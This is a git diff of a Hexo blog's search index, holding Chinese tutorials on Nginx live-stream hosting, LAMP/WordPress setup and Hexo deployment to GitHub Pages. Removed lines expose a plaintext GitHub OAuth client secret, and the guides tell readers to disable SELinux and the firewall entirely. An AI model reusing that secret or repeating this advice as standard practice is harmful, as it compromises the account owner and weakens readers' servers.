-<h2 id="8、其他注意事项"><a href="#8、其他注意事项" class="headerlink" title="8、其他注意事项"></a>8、其他注意事项</h2><pre class="highlight"><span class="line">/var/lib/mysql				# mysql数据路径</span><br><span class="line">/usr/local/nginx/html		# Nginx默认网站路径</span><br><span class="line">/etc/nginx/nginx.conf		# Nginx配置文件</span><br></pre>
-
-
-
-<p>修改root /var/www/html即可改变默认路径</p>
-<p> <img src="/article/1.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/1.png" class="lozad post-image"></p>
-<h1 id="Nginx搭建直播推流平台"><a href="#Nginx搭建直播推流平台" class="headerlink" title="Nginx搭建直播推流平台"></a>Nginx搭建直播推流平台</h1><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p>nginx-http-flv-module-master.zip + OBS Studio（pc端）/杏林推流（app端）</p>
-<h2 id="1、源码安装，配置"><a href="#1、源码安装，配置" class="headerlink" title="1、源码安装，配置"></a>1、源码安装，配置</h2><p>在nginx源码编译基础上，增加–add-module=/home/chen/software/nginx-http-flv-module-master（导入为绝对路径），即：</p>
-<pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module --add-module=/home/chen/software/nginx-http-flv-module-master</span><br></pre>
-
-
-
-<h2 id="2、make、make-install"><a href="#2、make、make-install" class="headerlink" title="2、make、make install"></a>2、make、make install</h2><h2 id="3、修改配置文件"><a href="#3、修改配置文件" class="headerlink" title="3、修改配置文件"></a>3、修改配置文件</h2><p>（/etc/nginx/nginx.conf）</p>
-<p>在http中新增（与最内层函数同级）</p>
-<pre class="highlight"><span class="line">location /live &#123;</span><br><span class="line"></span><br><span class="line">  flv_live on;</span><br><span class="line"></span><br><span class="line">  chunked_transfer_encoding on;</span><br><span class="line"></span><br><span class="line">  add_header Access-Control-Allow-Origin *;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>
-
-<p>在文件末尾新增（与http函数同级）</p>
-<pre class="highlight"><span class="line">rtmp &#123;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line"></span><br><span class="line">		listen 1935;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">		application chen &#123;</span><br><span class="line"></span><br><span class="line">			live on;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>
-
-<p>（注！live不可更改，会导致无法加载视频）</p>
-<h2 id="4、检查"><a href="#4、检查" class="headerlink" title="4、检查"></a>4、检查</h2><pre class="highlight"><span class="line">nginx -t		# 检测配置文件有无语法错误</span><br><span class="line">nginx -s reload	# 重新加载</span><br></pre>
-
-
-
-<h2 id="5、推流设置"><a href="#5、推流设置" class="headerlink" title="5、推流设置"></a>5、推流设置</h2><p>OBS推流设置（PC）</p>
-<table>
-<thead>
-<tr>
-<th>说明</th>
-<th>命令</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>服务器</td>
-<td>rtmp://139.224.x.x/live/</td>
-</tr>
-<tr>
-<td>串流密钥</td>
-<td>chen（可更改，类似于密码）</td>
-</tr>
-</tbody></table>
-<p>杏林推流设置（APP）</p>
-<pre class="highlight"><span class="line">rtmp://139.224.x.x/live/chen</span><br></pre>
-
-
-
-<h2 id="6、观看"><a href="#6、观看" class="headerlink" title="6、观看"></a>6、观看</h2><pre class="highlight"><span class="line">http://bilibili.github.io/flv.js/demo/			#观看视频地址</span><br><span class="line">http://139.224.x.x/live?app=live&amp;stream=chen	#推流视频链接</span><br></pre>
-
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Nginx环境搭建</tag>
-        <tag>直播推流平台</tag>
+        <tag>DVWA</tag>
       </tags>
   </entry>
   <entry>
@@ -1621,6 +2260,58 @@
       </tags>
   </entry>
   <entry>
+    <title>搭建LAMP环境</title>
+    <url>/article/a964a121.html</url>
+    <content><![CDATA[<h1 id="LAMP："><a href="#LAMP：" class="headerlink" title="LAMP："></a>LAMP：</h1><p>Linux+Apache+Mysql+PHP</p>
+<h1 id="1、安装Apache（httpd）"><a href="#1、安装Apache（httpd）" class="headerlink" title="1、安装Apache（httpd）"></a>1、安装Apache（httpd）</h1><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
+
+<h1 id="2、启动apache并设置开机自启"><a href="#2、启动apache并设置开机自启" class="headerlink" title="2、启动apache并设置开机自启"></a>2、启动apache并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start httpd		#开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd		#查看apache状态</span><br></pre>
+
+
+
+<h1 id="3、安装Mysql"><a href="#3、安装Mysql" class="headerlink" title="3、安装Mysql"></a>3、安装Mysql</h1><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
+
+
+
+<h1 id="4、启动Mysql并设置开机自启"><a href="#4、启动Mysql并设置开机自启" class="headerlink" title="4、启动Mysql并设置开机自启"></a>4、启动Mysql并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start mariadb			#开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb		#查看mariadb状态</span><br></pre>
+
+
+
+<h1 id="5、配置Mysql数据库"><a href="#5、配置Mysql数据库" class="headerlink" title="5、配置Mysql数据库"></a>5、配置Mysql数据库</h1><pre class="highlight"><span class="line">mysql_secure_installation		#初始化mysql数据库（全部回车确认）</span><br></pre>
+
+<p>设置mysql密码（非操作系统密码）</p>
+<h1 id="6、安装PHP"><a href="#6、安装PHP" class="headerlink" title="6、安装PHP"></a>6、安装PHP</h1><p>(php-fpm php-mysqlnd不装，其他均可)</p>
+<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
+
+<h1 id="7、重启apache使php生效"><a href="#7、重启apache使php生效" class="headerlink" title="7、重启apache使php生效"></a>7、重启apache使php生效</h1><p>（php不是独立软件，依附apache）</p>
+<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
+
+<h1 id="8、解压WP网站"><a href="#8、解压WP网站" class="headerlink" title="8、解压WP网站"></a>8、解压WP网站</h1><h1 id="9、复制WP网站文件至Apache网站目录"><a href="#9、复制WP网站文件至Apache网站目录" class="headerlink" title="9、复制WP网站文件至Apache网站目录"></a>9、复制WP网站文件至Apache网站目录</h1><pre class="highlight"><span class="line">cp -r WP/* /var/www/html</span><br></pre>
+
+<h1 id="10、赋予Apache网站apache权限"><a href="#10、赋予Apache网站apache权限" class="headerlink" title="10、赋予Apache网站apache权限"></a>10、赋予Apache网站apache权限</h1><p>（apache服务由apache账户运行，还权限，安全控制）</p>
+<pre class="highlight"><span class="line">chown -R apache:apache /var/www/html</span><br></pre>
+
+<h1 id="11、禁用SELinux"><a href="#11、禁用SELinux" class="headerlink" title="11、禁用SELinux"></a>11、禁用SELinux</h1><p>（安全访问控制，影响网站访问）</p>
+<pre class="highlight"><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line"></span><br><span class="line">修改SELINUX=disabled</span><br><span class="line">重启操作系统（reboot）</span><br></pre>
+
+
+
+<h1 id="12、访问网站ip-80端口，安装wp网站"><a href="#12、访问网站ip-80端口，安装wp网站" class="headerlink" title="12、访问网站ip+80端口，安装wp网站"></a>12、访问网站ip+80端口，安装wp网站</h1><h1 id="13、此时需要设置mysql账户"><a href="#13、此时需要设置mysql账户" class="headerlink" title="13、此时需要设置mysql账户"></a>13、此时需要设置mysql账户</h1><pre class="highlight"><span class="line">mysql -uroot -p			# 启动mysql（需要输入mysql密码）</span><br><span class="line">create database wp_web;	# 创建mysql账户</span><br><span class="line">exit					# 退出mysql</span><br><span class="line"></span><br></pre>
+
+<p>（注意！wp-config.php  删除可重装wp网站）</p>
+<h1 id="14、其他"><a href="#14、其他" class="headerlink" title="14、其他"></a>14、其他</h1><pre class="highlight"><span class="line">/var/www/html					# Apache默认网站路径</span><br><span class="line">/etc/httpd/conf/httpd.conf		# Apache配置文件路径</span><br></pre>
+
+<p>修改DocumentRoot “/var/www”即可修改网站路径</p>
+<p> <img src="/article/2.png" alt="2" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/2.png" class="lozad post-image"></p>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>LAMP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>搭建hexo博客</title>
     <url>/article/8e88d59c.html</url>
     <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Github Pages</p>
@@ -1638,11 +2329,11 @@
 </thead>
 <tbody><tr>
 <td>设置用户名邮箱</td>
-<td>git config –global user.name “zeroChen00”<br>git config –global user.email “<a href="mailto:&#x31;&#54;&#x35;&#50;&#x35;&#x36;&#48;&#57;&#51;&#56;&#64;&#113;&#x71;&#46;&#x63;&#111;&#x6d;">&#x31;&#54;&#x35;&#50;&#x35;&#x36;&#48;&#57;&#51;&#56;&#64;&#113;&#x71;&#46;&#x63;&#111;&#x6d;</a>“</td>
+<td>git config –global user.name “zeroChen00”<br>git config –global user.email “<a href="mailto:&#49;&#x36;&#x35;&#50;&#x35;&#54;&#48;&#57;&#51;&#x38;&#x40;&#x71;&#113;&#46;&#99;&#111;&#109;">&#49;&#x36;&#x35;&#50;&#x35;&#54;&#48;&#57;&#51;&#x38;&#x40;&#x71;&#113;&#46;&#99;&#111;&#109;</a>“</td>
 </tr>
 <tr>
 <td>创建SSH密匙</td>
-<td>ssh-keygen -t rsa -C “<a href="mailto:&#x31;&#x36;&#x35;&#x32;&#x35;&#54;&#48;&#x39;&#51;&#56;&#64;&#113;&#x71;&#46;&#99;&#111;&#x6d;">&#x31;&#x36;&#x35;&#x32;&#x35;&#54;&#48;&#x39;&#51;&#56;&#64;&#113;&#x71;&#46;&#99;&#111;&#x6d;</a>“（全部回车）</td>
+<td>ssh-keygen -t rsa -C “<a href="mailto:&#x31;&#x36;&#x35;&#50;&#x35;&#x36;&#48;&#57;&#x33;&#56;&#x40;&#x71;&#113;&#x2e;&#x63;&#111;&#109;">&#x31;&#x36;&#x35;&#50;&#x35;&#x36;&#48;&#57;&#x33;&#56;&#x40;&#x71;&#113;&#x2e;&#x63;&#111;&#109;</a>“（全部回车）</td>
 </tr>
 <tr>
 <td>添加密匙</td>
@@ -1650,7 +2341,7 @@
 </tr>
 <tr>
 <td>验证连接</td>
-<td>ssh -T <a href="mailto:&#103;&#x69;&#x74;&#x40;&#x67;&#x69;&#x74;&#x68;&#117;&#x62;&#46;&#x63;&#111;&#x6d;">&#103;&#x69;&#x74;&#x40;&#x67;&#x69;&#x74;&#x68;&#117;&#x62;&#46;&#x63;&#111;&#x6d;</a>（yes确认）<br>显示 “Hi xxx! You’ve successfully……” 即连接成功</td>
+<td>ssh -T <a href="mailto:&#103;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#x6d;">&#103;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#x68;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#x6d;</a>（yes确认）<br>显示 “Hi xxx! You’ve successfully……” 即连接成功</td>
 </tr>
 </tbody></table>
 <h2 id="2、创建Github-Pages仓库"><a href="#2、创建Github-Pages仓库" class="headerlink" title="2、创建Github Pages仓库"></a>2、创建Github Pages仓库</h2><p>Github - 加号 - New repository - Repository name 中输入 用户名.github.io - 创建</p>
@@ -1705,7 +2396,7 @@
 </tr>
 <tr>
 <td>修改 _config.yml 文件末尾的Deployment 部分</td>
-<td align="left">deploy: <br>    type: git<br>    repository: <a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#105;&#x74;&#104;&#117;&#x62;&#46;&#x63;&#111;&#109;">&#x67;&#x69;&#116;&#64;&#103;&#105;&#x74;&#104;&#117;&#x62;&#46;&#x63;&#111;&#109;</a>:zeroChen00/zeroChen00.github.io.git<br>    branch: maste</td>
+<td align="left">deploy: <br>    type: git<br>    repository: <a href="mailto:&#x67;&#105;&#116;&#64;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#109;">&#x67;&#105;&#116;&#64;&#x67;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#109;</a>:zeroChen00/zeroChen00.github.io.git<br>    branch: master</td>
 </tr>
 <tr>
 <td>上传部署</td>
@@ -1720,65 +2411,60 @@
 <h1 id="四、主题配置"><a href="#四、主题配置" class="headerlink" title="四、主题配置"></a>四、主题配置</h1><table>
 <thead>
 <tr>
-<th>操作</th>
-<th align="left">命令</th>
+<th><strong>操作</strong></th>
+<th><strong>命令</strong></th>
 </tr>
 </thead>
 <tbody><tr>
 <td>下载</td>
-<td align="left">git clone <a href="https://github.com/Fechin/hexo-theme-diaspora.git">https://github.com/Fechin/hexo-theme-diaspora.git</a>  themes/diaspora</td>
+<td>git  clone <a href="https://github.com/theme-kaze/hexo-theme-kaze.git">https://github.com/theme-kaze/hexo-theme-kaze.git</a>  themes/kaze</td>
 </tr>
 <tr>
 <td>修改全局配置文件_config.yml</td>
-<td align="left">theme:  diaspora</td>
+<td>theme: kaze</td>
 </tr>
 <tr>
 <td>新建页面</td>
-<td align="left">hexo new  page categories  <br>新增  <br>type:  “categories”</td>
+<td>hexo new page “about”</td>
 </tr>
 <tr>
-<td>新建标签</td>
-<td align="left">hexo new  page tags  <br>新增  <br>type: “tags”</td>
+<td>搜索</td>
+<td>search:   enable: true   path: search.json   field: posts   searchContent: true</td>
 </tr>
 <tr>
-<td>安装搜索插件</td>
-<td align="left">npm install  hexo-generator-searchdb –save</td>
-</tr>
-<tr>
-<td>修改全局配置文件_config.yml</td>
-<td align="left">search:<br>    path: search.xml<br>    field: post<br>    format: html<br>    limit: 10000</td>
-</tr>
-<tr>
-<td>新建页面</td>
-<td align="left">hexo new  page search  <br>新增  <br>type:  “search”</td>
-</tr>
-<tr>
-<td>主题配置文件启用全局搜索（已有，勿新增）</td>
-<td align="left">#本地搜索,请将索引文件放在网站根目录  <br>local_search:     <br>#是否启用    <br>    enable: true</td>
+<td>其他配置</td>
+<td><a href="https://demo.theme-kaze.top/document/">https://demo.theme-kaze.top/document/</a></td>
 </tr>
 <tr>
 <td>开启评论</td>
-<td align="left">1、注册OAuth application<br>setting-Developer setting-Oauth Apps-new<br><img src="/article/.%5C%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2.assets%5C20190708182819187.png" alt="20190708182819187" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/.%5C%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2.assets%5C20190708182819187.png" class="lozad post-image"><br>2、修改主题配置文件<br><img src="/article/.%5C%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2.assets%5C20190708184151274-1624155829307.png" alt="20190708184151274" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/.%5C%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2.assets%5C20190708184151274-1624155829307.png" class="lozad post-image"><br>如下：<br>    # Gitalk 评论插件（<a href="https://github.com/gitalk/gitalk%EF%BC%89">https://github.com/gitalk/gitalk）</a><br>    gitalk:<br>        # 是否启用评论功能<br>        enable: true<br>        # 是否自动展开评论框<br>        autoExpand: false<br>        # 应用编号<br>        clientID: ‘e231ce2fa07f8397e8a7’<br>        # 应用秘钥<br>        clientSecret: ‘feb843942f9c476a9b974bb09f0e5135f9ca8f87’<br>        # issue仓库名<br>        repo: ‘zerochen00.github.io’<br>        # Github名<br>        owner: ‘zeroChen00’<br>        # Github名<br>        admin: [‘zeroChen00’]<br>        # Ensure uniqueness and length less than 50<br>        id: location.pathname<br>        # Facebook-like distraction free mode<br>        distractionFreeMode: true<br><br>注意：用户名大小写，评论用户时需要github账户处于登录状态<br></td>
+<td>1、注册OAuth application <br><img src="/article/20190708182819187.png" alt="20190708182819187" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/20190708182819187.png" class="lozad post-image"><br>2、修改主题配置文件<img src="/article/20190708184151274.png" alt="20190708184151274" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/20190708184151274.png" class="lozad post-image">&lt;br /</td>
 </tr>
 </tbody></table>
-<h1 id="五、使用"><a href="#五、使用" class="headerlink" title="五、使用"></a>五、使用</h1><table>
+<p>语句如下</p>
+<pre class="highlight"><span class="line">gitalk: </span><br><span class="line">    enable: true #是否开启</span><br><span class="line">    clientID: &#x27;e231ce2...&#x27;</span><br><span class="line">    clientSecret: &#x27;2fb4635367c...&#x27;</span><br><span class="line">    repo: &#x27;zeroChen00.github.io&#x27;</span><br><span class="line">    owner: &#x27;zeroChen00&#x27;</span><br><span class="line">    admin: [&#x27;zeroChen00&#x27;]</span><br><span class="line">    id: location.href</span><br><span class="line">    distractionFreeMode: true</span><br><span class="line">    # en | zh-CN | zh-TW</span><br><span class="line">    # language: navigator.language || navigator.userLanguage</span><br><span class="line">    language: zh-CN</span><br><span class="line">    labels: [&#x27;Gitalk&#x27;]</span><br><span class="line">    perPage: 10</span><br></pre>
+
+
+
+<h1 id="五、图片无法显示问题"><a href="#五、图片无法显示问题" class="headerlink" title="五、图片无法显示问题"></a>五、图片无法显示问题</h1><p>根目录配置文件开启post_asset_folder: true（typora的需要配置文件上传路径为相同路径）</p>
+<p>使用相对路径引用文件即可</p>
+<h1 id="六、使用"><a href="#六、使用" class="headerlink" title="六、使用"></a><strong>六、使用</strong></h1><table>
 <thead>
 <tr>
-<th>操作</th>
-<th>命令</th>
+<th><strong>操作</strong></th>
+<th><strong>命令</strong></th>
 </tr>
 </thead>
 <tbody><tr>
 <td>1、写博客</td>
-<td>hexo new  “My New Post”  source  文件夹中会出现一个 My New Post.md 文件</td>
+<td>hexo new “My New  Post”   source 文件夹中会出现一个 My New  Post.md 文件</td>
 </tr>
 <tr>
 <td>或贴入.md文件（需要增加文件头）</td>
-<td>—<br>title: Hello World # 标题<br>date: 2019/3/26 hh:mm:ss # 时间<br>categories: # 分类<br>- Diary<br>tags: # 标签<br>- PS3<br>- Games<br>—</td>
+<td>—   title: Hello World   # 标题   date: 2019/3/26  hh:mm:ss   # 时间   categories: # 分类   - Diary tags: # 标签   - PS3   - Games  —</td>
 </tr>
 <tr>
 <td>2、更新并发布静态博客</td>
-<td>hexo g  # 生成页面  hexo  d  # 部署发布</td>
+<td>hexo g # 生成页面   hexo d # 部署发布</td>
 </tr>
 <tr>
 <td>3、更改配置</td>
@@ -1786,7 +2472,7 @@
 </tr>
 <tr>
 <td>4、更换主题</td>
-<td><a href="https://hexo.io/themes/">https://hexo.io/themes/</a>  git clone  _file ./themes/file  根据主题介绍进行下载并配置_config.yml文件（更改主题名称等）</td>
+<td><a href="https://hexo.io/themes/">https://hexo.io/themes/</a> git clone <em>file ./themes/file</em>   <em>根据主题介绍进行下载并配置</em>config.yml文件（更改主题名称等）</td>
 </tr>
 </tbody></table>
 ]]></content>
@@ -1795,6 +2481,90 @@
       </categories>
       <tags>
         <tag>hexo博客</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>搭建Nginx + 直播推流平台</title>
+    <url>/article/f9829b94.html</url>
+    <content><![CDATA[<h1 id="搭建Nginx环境"><a href="#搭建Nginx环境" class="headerlink" title="搭建Nginx环境"></a>搭建Nginx环境</h1><h2 id="1、下载Nginx源码包"><a href="#1、下载Nginx源码包" class="headerlink" title="1、下载Nginx源码包"></a>1、下载Nginx源码包</h2><pre class="highlight"><span class="line">curl http://nginx.org/download/nginx-1.20.1.tar.gz -o nginx-1.20.1.tar.gz</span><br></pre>
+
+
+
+<h2 id="2、解压源码包"><a href="#2、解压源码包" class="headerlink" title="2、解压源码包"></a>2、解压源码包</h2><pre class="highlight"><span class="line">tar -zxvf nginx-1.20.1.tar.gz -C ../	# -C指定解压路径</span><br></pre>
+
+
+
+<h2 id="3、配置生成文件（一般修改配置文件、日志文件路径）"><a href="#3、配置生成文件（一般修改配置文件、日志文件路径）" class="headerlink" title="3、配置生成文件（一般修改配置文件、日志文件路径）"></a>3、配置生成文件（一般修改配置文件、日志文件路径）</h2><pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module</span><br></pre>
+
+<p>注：需要下载配置环境</p>
+<p>如：</p>
+<pre class="highlight"><span class="line">yum install pcre-devel zlib-devel openssl-devel</span><br></pre>
+
+
+
+<h2 id="4、make编译"><a href="#4、make编译" class="headerlink" title="4、make编译"></a>4、make编译</h2><h2 id="5、make-install安装"><a href="#5、make-install安装" class="headerlink" title="5、make install安装"></a>5、make install安装</h2><h2 id="6、添加nginx到环境变量"><a href="#6、添加nginx到环境变量" class="headerlink" title="6、添加nginx到环境变量"></a>6、添加nginx到环境变量</h2><pre class="highlight"><span class="line">ln -s /usr/local/nginx/sbin/nginx /usr/local/bin/</span><br></pre>
+
+<p>（注！ /usr/local/nginx/sbin/nginx为nginx启动文件的绝对路径）</p>
+<p>此时可直接使用nginx命令，如：nginx -s stop停止nginx服务</p>
+<h2 id="7、关闭防火墙"><a href="#7、关闭防火墙" class="headerlink" title="7、关闭防火墙"></a>7、关闭防火墙</h2><pre class="highlight"><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">systemctl disable firewalld		#永久禁用</span><br></pre>
+
+<p>至此，访问80端口可看到Nginx测试页</p>
+<p> 下载任意html静态网站压缩包，解压并复制到Nginx网站路径，即可访问静态网页</p>
+<h2 id="8、其他注意事项"><a href="#8、其他注意事项" class="headerlink" title="8、其他注意事项"></a>8、其他注意事项</h2><pre class="highlight"><span class="line">/var/lib/mysql				# mysql数据路径</span><br><span class="line">/usr/local/nginx/html		# Nginx默认网站路径</span><br><span class="line">/etc/nginx/nginx.conf		# Nginx配置文件</span><br></pre>
+
+
+
+<p>修改root /var/www/html即可改变默认路径</p>
+<p> <img src="/article/1.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/1.png" class="lozad post-image"></p>
+<h1 id="Nginx搭建直播推流平台"><a href="#Nginx搭建直播推流平台" class="headerlink" title="Nginx搭建直播推流平台"></a>Nginx搭建直播推流平台</h1><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p>nginx-http-flv-module-master.zip + OBS Studio（pc端）/杏林推流（app端）</p>
+<h2 id="1、源码安装，配置"><a href="#1、源码安装，配置" class="headerlink" title="1、源码安装，配置"></a>1、源码安装，配置</h2><p>在nginx源码编译基础上，增加–add-module=/home/chen/software/nginx-http-flv-module-master（导入为绝对路径），即：</p>
+<pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module --add-module=/home/chen/software/nginx-http-flv-module-master</span><br></pre>
+
+
+
+<h2 id="2、make、make-install"><a href="#2、make、make-install" class="headerlink" title="2、make、make install"></a>2、make、make install</h2><h2 id="3、修改配置文件"><a href="#3、修改配置文件" class="headerlink" title="3、修改配置文件"></a>3、修改配置文件</h2><p>（/etc/nginx/nginx.conf）</p>
+<p>在http中新增（与最内层函数同级）</p>
+<pre class="highlight"><span class="line">location /live &#123;</span><br><span class="line"></span><br><span class="line">  flv_live on;</span><br><span class="line"></span><br><span class="line">  chunked_transfer_encoding on;</span><br><span class="line"></span><br><span class="line">  add_header Access-Control-Allow-Origin *;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>
+
+<p>在文件末尾新增（与http函数同级）</p>
+<pre class="highlight"><span class="line">rtmp &#123;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line"></span><br><span class="line">		listen 1935;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">		application chen &#123;</span><br><span class="line"></span><br><span class="line">			live on;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>
+
+<p>（注！live不可更改，会导致无法加载视频）</p>
+<h2 id="4、检查"><a href="#4、检查" class="headerlink" title="4、检查"></a>4、检查</h2><pre class="highlight"><span class="line">nginx -t		# 检测配置文件有无语法错误</span><br><span class="line">nginx -s reload	# 重新加载</span><br></pre>
+
+
+
+<h2 id="5、推流设置"><a href="#5、推流设置" class="headerlink" title="5、推流设置"></a>5、推流设置</h2><p>OBS推流设置（PC）</p>
+<table>
+<thead>
+<tr>
+<th>说明</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>服务器</td>
+<td>rtmp://139.224.x.x/live/</td>
+</tr>
+<tr>
+<td>串流密钥</td>
+<td>chen（可更改，类似于密码）</td>
+</tr>
+</tbody></table>
+<p>杏林推流设置（APP）</p>
+<pre class="highlight"><span class="line">rtmp://139.224.x.x/live/chen</span><br></pre>
+
+
+
+<h2 id="6、观看"><a href="#6、观看" class="headerlink" title="6、观看"></a>6、观看</h2><pre class="highlight"><span class="line">http://bilibili.github.io/flv.js/demo/			#观看视频地址</span><br><span class="line">http://139.224.x.x/live?app=live&amp;stream=chen	#推流视频链接</span><br></pre>
+
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>Nginx环境搭建</tag>
+        <tag>直播推流平台</tag>
       </tags>
   </entry>
 </search>
